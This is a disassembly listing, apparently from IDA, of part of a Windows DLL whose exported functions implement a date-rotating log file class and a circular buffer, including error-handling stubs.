		push	edi
		push	0Bh
		mov	ecx, esi
		call	sub_6AF3AF9B
		push	offset asc_6AF583E0 ; "	"
		push	offset pszTrimChars ; "\r\n"
		mov	ecx, esi
		call	sub_6AF3B014
		push	edi
		push	0Dh
		mov	ecx, esi
		call	sub_6AF3AF9B
		push	edi
		push	0Ah
		mov	ecx, esi
		call	sub_6AF3AF9B
		xor	eax, eax
		pop	edi
		inc	eax
		pop	esi
		retn	4
Ordinal406	endp

; Exported entry 408.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal408
Ordinal408	proc near		; CODE XREF: Ordinal409+10p
					; DATA XREF: .rdata:off_6AF66098o

var_60		= byte ptr -60h
SystemTime	= _SYSTEMTIME ptr -40h
Format		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_53 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 5Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_14], eax
		lea	eax, [ebp+SystemTime]
		mov	[ebp+var_10], esp
		push	eax		; lpSystemTime
		mov	esi, ecx
		call	ds:GetLocalTime
		push	offset aCautocyclelo_0 ; "CAutoCycleLogFile::BuildFileName()"
		lea	ecx, [ebp+var_60]
		call	Ordinal751
		xor	ebx, ebx
		lea	ecx, [ebp+var_28]
		mov	[ebp+var_4], ebx
		call	sub_6AF318C3
		mov	eax, [esi+34h]
		dec	eax
		dec	eax
		mov	byte ptr [ebp+var_4], 2
		jz	short loc_6AF3B385
		dec	eax
		jz	short loc_6AF3B373
		dec	eax
		jnz	short loc_6AF3B3A5
		movzx	eax, [ebp+SystemTime.wDay]
		push	eax		; Args
		push	offset a_02d	; "_%02d"

loc_6AF3B365:				; CODE XREF: Ordinal408+7Aj
		lea	eax, [ebp+var_28]
		push	eax		; int
		call	sub_6AF3217C
		add	esp, 0Ch
		jmp	short loc_6AF3B3A5
; ---------------------------------------------------------------------------

loc_6AF3B373:				; CODE XREF: Ordinal408+4Dj
		movzx	eax, [ebp+SystemTime.wDayOfWeek]
		push	ds:off_6AF58338[eax*4]
		push	offset a_S	; "_%s"
		jmp	short loc_6AF3B365
; ---------------------------------------------------------------------------

loc_6AF3B385:				; CODE XREF: Ordinal408+4Aj
		movzx	eax, [ebp+SystemTime.wDay]
		push	eax
		movzx	eax, [ebp+SystemTime.wMonth]
		push	eax
		movzx	eax, [ebp+SystemTime.wYear]
		push	eax		; Args
		lea	eax, [ebp+var_28]
		push	offset a_04d02d02d ; "_%04d%02d%02d"
		push	eax		; int
		call	sub_6AF3217C
		add	esp, 14h

loc_6AF3B3A5:				; CODE XREF: Ordinal408+50j
					; Ordinal408+68j
		lea	ecx, [ebp+var_2C]
		call	sub_6AF318C3
		cmp	[esi+3Ch], ebx
		mov	byte ptr [ebp+var_4], 3
		ja	short loc_6AF3B3BB
		cmp	[esi+38h], ebx
		jbe	short loc_6AF3B40C

loc_6AF3B3BB:				; CODE XREF: Ordinal408+ABj
		mov	eax, [esi+40h]
		xor	edi, edi
		inc	edi

loc_6AF3B3C1:				; CODE XREF: Ordinal408+C4j
		push	0Ah
		xor	edx, edx
		pop	ecx
		div	ecx
		cmp	eax, ebx
		jbe	short loc_6AF3B3CF
		inc	edi
		jmp	short loc_6AF3B3C1
; ---------------------------------------------------------------------------

loc_6AF3B3CF:				; CODE XREF: Ordinal408+C1j
		lea	ecx, [ebp+Format]
		call	sub_6AF318C3
		push	edi		; Args
		lea	eax, [ebp+Format]
		push	offset a_0Dlu	; "_%%0%dlu"
		push	eax		; int
		mov	byte ptr [ebp+var_4], 4
		call	sub_6AF3217C
		mov	edi, [ebp+Format]
		add	esp, 0Ch
		push	dword ptr [esi+44h] ; Args
		lea	eax, [ebp+var_2C]
		push	edi		; Format
		push	eax		; int
		call	sub_6AF3217C
		add	esp, 0Ch
		lea	ecx, [edi-10h]
		mov	byte ptr [ebp+var_4], 3
		call	sub_6AF3160D

loc_6AF3B40C:				; CODE XREF: Ordinal408+B0j
		lea	eax, [esi+24h]
		lea	edi, [esi+2Ch]
		push	eax
		mov	ecx, edi
		call	sub_6AF31C41
		push	5Ch
		mov	ecx, edi
		call	sub_6AF3213B
		push	offset SubBlock	; "\\"
		mov	ecx, edi
		call	sub_6AF3B24F
		lea	eax, [esi+28h]
		push	eax
		mov	ecx, edi
		call	sub_6AF3B274
		lea	eax, [ebp+var_28]
		push	eax
		mov	ecx, edi
		call	sub_6AF3B274
		lea	eax, [ebp+var_2C]
		push	eax
		mov	ecx, edi
		call	sub_6AF3B274
		push	offset dword_6AF583F0 ;	Str
		mov	ecx, edi
		call	sub_6AF3B24F
		add	esi, 30h
		push	esi
		mov	ecx, edi
		call	sub_6AF3B274
		mov	ecx, [ebp+var_2C]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_28]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D

loc_6AF3B47D:				; DATA XREF: sub_6AF3B4AD+3Do
					; sub_6AF3B4F0+4Fo
		lea	ecx, [ebp+var_60]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_60]
		inc	esi
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal408	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3B4AD	proc near		; DATA XREF: .rdata:6AF62A24o
		push	13h
		lea	ecx, [ebp-60h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-60h]
		call	Ordinal762
		mov	ecx, [ebp-64h]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-60h]
		call	Ordinal764
		lea	ecx, [ebp-60h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3B47D
		retn
sub_6AF3B4AD	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3B4F0	proc near		; DATA XREF: .rdata:6AF62A34o
		push	15h
		lea	ecx, [ebp-60h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-60h]
		call	Ordinal762
		mov	eax, [ebp-68h]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-60h]
		call	Ordinal764
		lea	ecx, [ebp-60h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3B47D
		retn
sub_6AF3B4F0	endp

; Exported entry 409.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal409
Ordinal409	proc near		; CODE XREF: Ordinal410+79p
					; Ordinal389+16Bp
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		push	edi
		lea	edi, [esi+8]
		mov	ecx, edi
		call	Ordinal774
		mov	ecx, esi
		call	Ordinal408
		test	eax, eax
		jnz	short loc_6AF3B56B
		push	offset aCautocyclelo_1 ; "CAutoCycleLogFile::Open() : BuildFileNa"...

loc_6AF3B563:				; CODE XREF: Ordinal409+58j
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3B5BC
; ---------------------------------------------------------------------------

loc_6AF3B56B:				; CODE XREF: Ordinal409+17j
		mov	eax, [esi+2Ch]
		xor	ecx, ecx
		xor	edx, edx
		cmp	[esp+8+arg_0], ecx
		push	ecx		; hTemplateFile
		setz	dl
		push	80h		; dwFlagsAndAttributes
		lea	edx, [edx+edx+2]
		push	edx		; dwCreationDisposition
		push	ecx		; lpSecurityAttributes
		push	1		; dwShareMode
		push	40000000h	; dwDesiredAccess
		push	eax		; Args
		mov	ecx, edi
		call	Ordinal773
		test	eax, eax
		jnz	short loc_6AF3B59F
		push	offset aCautocyclelo_2 ; "CAutoCycleLogFile::Open() : m_File.Open"...
		jmp	short loc_6AF3B563
; ---------------------------------------------------------------------------

loc_6AF3B59F:				; CODE XREF: Ordinal409+51j
		mov	ecx, edi
		call	Ordinal777
		test	eax, eax
		jnz	short loc_6AF3B5C0
		push	offset aCautocyclelo_3 ; "CAutoCycleLogFile::Open() : m_File.Seek"...
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, esi
		call	Ordinal390

loc_6AF3B5BC:				; CODE XREF: Ordinal409+24j
		xor	eax, eax
		jmp	short loc_6AF3B5C3
; ---------------------------------------------------------------------------

loc_6AF3B5C0:				; CODE XREF: Ordinal409+63j
		xor	eax, eax
		inc	eax

loc_6AF3B5C3:				; CODE XREF: Ordinal409+79j
		pop	edi
		pop	esi
		retn	4
Ordinal409	endp

; Exported entry 410.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal410
Ordinal410	proc near		; CODE XREF: Ordinal407+1Bp
					; DATA XREF: .rdata:off_6AF66098o

SystemTime	= _SYSTEMTIME ptr -10h

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		xor	ebx, ebx
		push	edi
		mov	esi, ecx
		xor	edi, edi
		inc	ebx
		cmp	[esi+3Ch], edi
		ja	short loc_6AF3B5E2
		cmp	[esi+38h], edi
		jbe	short loc_6AF3B605

loc_6AF3B5E2:				; CODE XREF: Ordinal410+13j
		mov	ecx, esi
		call	Ordinal397
		cmp	edx, [esi+3Ch]
		jb	short loc_6AF3B605
		ja	short loc_6AF3B5F5
		cmp	eax, [esi+38h]
		jbe	short loc_6AF3B605

loc_6AF3B5F5:				; CODE XREF: Ordinal410+26j
		inc	dword ptr [esi+44h]
		mov	eax, [esi+44h]
		cmp	eax, [esi+40h]
		jbe	short loc_6AF3B603
		mov	[esi+44h], ebx

loc_6AF3B603:				; CODE XREF: Ordinal410+36j
		mov	edi, ebx

loc_6AF3B605:				; CODE XREF: Ordinal410+18j
					; Ordinal410+24j ...
		lea	eax, [ebp+SystemTime]
		push	eax		; lpSystemTime
		call	ds:GetLocalTime
		test	edi, edi
		jnz	short loc_6AF3B63E
		mov	eax, [esi+34h]
		cmp	eax, 2
		jl	short loc_6AF3B648
		cmp	eax, 4
		jg	short loc_6AF3B648
		mov	ax, [ebp+SystemTime.wYear]
		cmp	ax, [esi+14h]
		jnz	short loc_6AF3B63E
		mov	ax, [ebp+SystemTime.wMonth]
		cmp	ax, [esi+16h]
		jnz	short loc_6AF3B63E
		mov	ax, [ebp+SystemTime.wDay]
		cmp	ax, [esi+1Ah]
		jz	short loc_6AF3B648

loc_6AF3B63E:				; CODE XREF: Ordinal410+49j
					; Ordinal410+60j ...
		push	ebx
		mov	ecx, esi
		call	Ordinal409
		jmp	short loc_6AF3B64A
; ---------------------------------------------------------------------------

loc_6AF3B648:				; CODE XREF: Ordinal410+51j
					; Ordinal410+56j ...
		mov	eax, ebx

loc_6AF3B64A:				; CODE XREF: Ordinal410+7Ej
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal410	endp

; Exported entry 389.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal389(LPCSTR Src, int, int, int, int)
		public Ordinal389
Ordinal389	proc near		; DATA XREF: .rdata:off_6AF66098o

var_5C		= byte ptr -5Ch
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
var_24		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		mov	eax, offset unknown_libname_54 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 50h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		mov	[ebp+var_14], eax
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_5C]
		mov	[ebp+var_28], esi
		call	Ordinal1228
		cmp	[ebp+Src], ebx
		mov	[ebp+var_4], ebx
		jz	loc_6AF3B7CB
		push	[ebp+Src]	; lpString
		mov	edi, ds:lstrlenA
		call	edi ; lstrlenA
		test	eax, eax
		jz	loc_6AF3B7CB
		cmp	[ebp+arg_4], ebx
		jz	loc_6AF3B7CB
		push	[ebp+arg_4]	; lpString
		call	edi ; lstrlenA
		test	eax, eax
		jz	loc_6AF3B7CB
		cmp	[ebp+arg_C], ebx
		jz	loc_6AF3B7CB
		mov	ecx, esi
		call	Ordinal390
		push	offset aCautocyclelo_4 ; "CAutoCycleLogFile::Open()"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		push	[ebp+Src]	; Src
		lea	ecx, [esi+24h]
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31B1D
		push	[ebp+arg_4]	; Src
		lea	ecx, [esi+28h]
		call	sub_6AF31B1D
		push	[ebp+arg_8]	; Src
		lea	ecx, [esi+30h]
		call	sub_6AF31B1D
		jmp	loc_6AF3B799
; ---------------------------------------------------------------------------

loc_6AF3B6FC:				; DATA XREF: .rdata:6AF62A94o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3B794
		retn
; ---------------------------------------------------------------------------

loc_6AF3B73F:				; DATA XREF: .rdata:6AF62AA4o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+var_24]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+var_24]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3B794
		retn
; ---------------------------------------------------------------------------

loc_6AF3B794:				; DATA XREF: Ordinal389+EAo
					; Ordinal389+13Fo
		mov	esi, [ebp+var_28]
		xor	ebx, ebx

loc_6AF3B799:				; CODE XREF: Ordinal389+A8j
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF3B7AF
		lea	ecx, [ebp+var_48]
		call	Ordinal752
		jmp	short loc_6AF3B7D6
; ---------------------------------------------------------------------------

loc_6AF3B7AF:				; CODE XREF: Ordinal389+154j
		mov	eax, [ebp+arg_C]
		push	[ebp+arg_10]
		mov	ecx, esi
		mov	[esi+34h], eax
		call	Ordinal409
		lea	ecx, [ebp+var_48]
		mov	esi, eax
		call	Ordinal752
		jmp	short loc_6AF3B7D8
; ---------------------------------------------------------------------------

loc_6AF3B7CB:				; CODE XREF: Ordinal389+37j
					; Ordinal389+4Aj ...
		push	offset aCautocyclelo_5 ; "CAutoCycleLogFile::Open() : szDirectory"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF3B7D6:				; CODE XREF: Ordinal389+15Ej
		xor	esi, esi

loc_6AF3B7D8:				; CODE XREF: Ordinal389+17Aj
		lea	ecx, [ebp+var_5C]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	14h
Ordinal389	endp ; sp-analysis failed

; Exported entry 407.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal407
Ordinal407	proc near		; CODE XREF: Ordinal393+93p
					; Ordinal1202+237p
					; DATA XREF: ...

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+4Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	ecx, esi
		call	Ordinal410
		test	eax, eax
		jnz	short loc_6AF3B82E
		push	offset aCautocyclelo_6 ; "CAutoCycleLogFile::LogEx() : CycleLogFi"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3B86B
; ---------------------------------------------------------------------------

loc_6AF3B82E:				; CODE XREF: Ordinal407+22j
		mov	eax, [ebp+arg_0]
		mov	eax, [eax]
		mov	ecx, [eax-0Ch]
		push	edi		; Args
		push	ecx		; nNumberOfBytesToWrite
		lea	edi, [esi+8]
		push	eax		; lpBuffer
		mov	ecx, edi
		call	Ordinal780
		test	eax, eax
		jnz	short loc_6AF3B856
		push	offset aCautocyclelo_7 ; "CAutoCycleLogFile::LogEx() : m_File.Wri"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3B86A
; ---------------------------------------------------------------------------

loc_6AF3B856:				; CODE XREF: Ordinal407+4Aj
		cmp	dword ptr [esi+48h], 0
		jz	short loc_6AF3B867
		mov	ecx, edi
		call	Ordinal785
		mov	esi, eax
		jmp	short loc_6AF3B86A
; ---------------------------------------------------------------------------

loc_6AF3B867:				; CODE XREF: Ordinal407+5Fj
		xor	esi, esi
		inc	esi

loc_6AF3B86A:				; CODE XREF: Ordinal407+59j
					; Ordinal407+6Aj
		pop	edi

loc_6AF3B86B:				; CODE XREF: Ordinal407+31j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	4
Ordinal407	endp

; Exported entry 393.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal393(char	*Format, va_list Args)
		public Ordinal393
Ordinal393	proc near		; CODE XREF: Ordinal392+Dp
					; DATA XREF: .rdata:off_6AF66098o

var_4C		= byte ptr -4Ch
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Format		= dword	ptr  8
Args		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_55 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 48h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		lea	ecx, [ebp+var_28]
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_2C], esi
		call	sub_6AF318C3
		and	[ebp+var_4], 0
		push	offset aCautocyclelo_8 ; "CAutoCycleLogFile::LogV"
		lea	ecx, [ebp+var_4C]
		call	Ordinal751
		push	[ebp+Args]	; Args
		lea	ecx, [ebp+var_28]
		push	[ebp+Format]	; Format
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31BF4
		mov	eax, [esi]
		lea	ecx, [ebp+var_28]
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF3B8E3
		push	offset aCautocyclelo_9 ; "CAutoCycleLogFile::LogV() : Filter() =="...
		call	sub_6AF3102E
		pop	ecx

loc_6AF3B8DF:				; CODE XREF: Ordinal393+8Aj
		xor	esi, esi
		jmp	short loc_6AF3B914
; ---------------------------------------------------------------------------

loc_6AF3B8E3:				; CODE XREF: Ordinal393+58j
		mov	esi, offset pszTrimChars ; "\r\n"
		push	esi		; unsigned __int8 *
		lea	ecx, [ebp+var_28]
		call	sub_6AF3B17D
		push	esi		; Str
		lea	ecx, [ebp+var_28]
		call	sub_6AF3B24F

loc_6AF3B8FA:				; DATA XREF: sub_6AF3B942+3Do
					; sub_6AF3B985+4Fo
		lea	ecx, [ebp+var_4C]
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF3B8DF
		mov	ecx, [ebp+var_2C]
		lea	eax, [ebp+var_28]
		push	eax
		call	Ordinal407
		mov	esi, eax

loc_6AF3B914:				; CODE XREF: Ordinal393+67j
		lea	ecx, [ebp+var_4C]
		call	Ordinal752
		mov	ecx, [ebp+var_28]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal393	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3B942	proc near		; DATA XREF: .rdata:6AF62B04o
		push	13h
		lea	ecx, [ebp-4Ch]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-4Ch]
		call	Ordinal762
		mov	ecx, [ebp-50h]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-4Ch]
		call	Ordinal764
		lea	ecx, [ebp-4Ch]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3B8FA
		retn
sub_6AF3B942	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3B985	proc near		; DATA XREF: .rdata:6AF62B14o
		push	15h
		lea	ecx, [ebp-4Ch]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-4Ch]
		call	Ordinal762
		mov	eax, [ebp-54h]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-4Ch]
		call	Ordinal764
		lea	ecx, [ebp-4Ch]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3B8FA
		retn
sub_6AF3B985	endp

; Exported entry 392.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal392(int, char *Format, char Args)
		public Ordinal392
Ordinal392	proc near		; CODE XREF: Ordinal384+Dp
					; Ordinal385+12p ...

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		mov	ecx, [esp+arg_0]
		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		call	Ordinal393
		retn
Ordinal392	endp

; Exported entry 384.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal384(int, char Args)
		public Ordinal384
Ordinal384	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= byte ptr  4

		push	esi
		push	dword ptr [esp+4+Args] ; Args
		mov	esi, ecx
		push	offset aLd	; "%ld"
		push	esi		; int
		call	Ordinal392
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn	4
Ordinal384	endp

; Exported entry 385.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal385(char Args, double)
		public Ordinal385
Ordinal385	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= qword	ptr -0Ch
arg_0		= qword	ptr  4

		fld	[esp+arg_0]
		push	esi
		push	ecx
		push	ecx		; Args
		fstp	[esp+0Ch+var_C]
		mov	esi, ecx
		push	offset asc_6AF585F8 ; "%f"
		push	esi		; int
		call	Ordinal392
		add	esp, 10h
		mov	eax, esi
		pop	esi
		retn	8
Ordinal385	endp

; Exported entry 386.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal386(int, char Args)
		public Ordinal386
Ordinal386	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= byte ptr  4

		push	esi
		push	dword ptr [esp+4+Args] ; Args
		mov	esi, ecx
		push	offset aLu	; "%lu"
		push	esi		; int
		call	Ordinal392
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn	4
Ordinal386	endp

; Exported entry 387.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal387(int, char)
		public Ordinal387
Ordinal387	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= byte ptr  4

		movsx	eax, [esp+arg_0]
		push	esi
		push	eax		; Args
		mov	esi, ecx
		push	offset aC	; "%c"
		push	esi		; int
		call	Ordinal392
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn	4
Ordinal387	endp

; Exported entry 388.

; =============== S U B	R O U T	I N E =======================================


; int __thiscall Ordinal388(int, char Args)
		public Ordinal388
Ordinal388	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= byte ptr  4

		push	esi
		push	dword ptr [esp+4+Args] ; Args
		mov	esi, ecx
		push	offset aS	; "%s"
		push	esi		; int
		call	Ordinal392
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn	4
Ordinal388	endp

; Exported entry 411.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal411
Ordinal411	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+4]
		mov	dword ptr [esi], offset	off_6AF58608
		call	Ordinal861
		xor	eax, eax
		lea	ecx, [esi+28h]
		mov	[esi+14h], eax
		mov	[esi+18h], eax
		mov	[esi+1Ch], eax
		mov	[esi+20h], eax
		mov	[esi+24h], eax
		call	Ordinal1278
		mov	eax, esi
		pop	esi
		retn
Ordinal411	endp

; Exported entry 413.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal413(int,	SIZE_T dwBytes)
		public Ordinal413
Ordinal413	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
dwBytes		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+28h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		push	[ebp+dwBytes]	; dwBytes
		lea	ebx, [esi+4]
		push	[ebp+arg_0]	; int
		mov	ecx, ebx
		call	Ordinal869
		test	eax, eax
		mov	[esi+14h], eax
		jnz	short loc_6AF3BAE9
		push	offset aCcircularbuffe ; "CCircularBuffer::Create() : m_Buffer.Al"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3BB07
; ---------------------------------------------------------------------------

loc_6AF3BAE9:				; CODE XREF: Ordinal413+2Fj
		push	edi
		mov	edi, [esi+14h]
		mov	ecx, ebx
		call	Ordinal236
		and	dword ptr [esi+24h], 0
		add	eax, edi
		mov	[esi+20h], edi
		mov	[esi+1Ch], edi
		mov	[esi+18h], eax
		xor	esi, esi
		inc	esi
		pop	edi

loc_6AF3BB07:				; CODE XREF: Ordinal413+3Ej
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal413	endp

; Exported entry 414.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal414
Ordinal414	proc near		; CODE XREF: Ordinal412+9p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+28h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	ecx, [esi+4]
		call	Ordinal874
		and	dword ptr [esi+20h], 0
		and	dword ptr [esi+1Ch], 0
		and	dword ptr [esi+24h], 0
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	esi
		leave
		retn
Ordinal414	endp

; Exported entry 415.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal415
Ordinal415	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+28h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [esi+14h]
		and	dword ptr [esi+24h], 0
		lea	ecx, [ebp+var_C]
		mov	[esi+20h], eax
		mov	[esi+1Ch], eax
		call	Ordinal1230
		pop	esi
		leave
		retn
Ordinal415	endp

; Exported entry 421.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal421
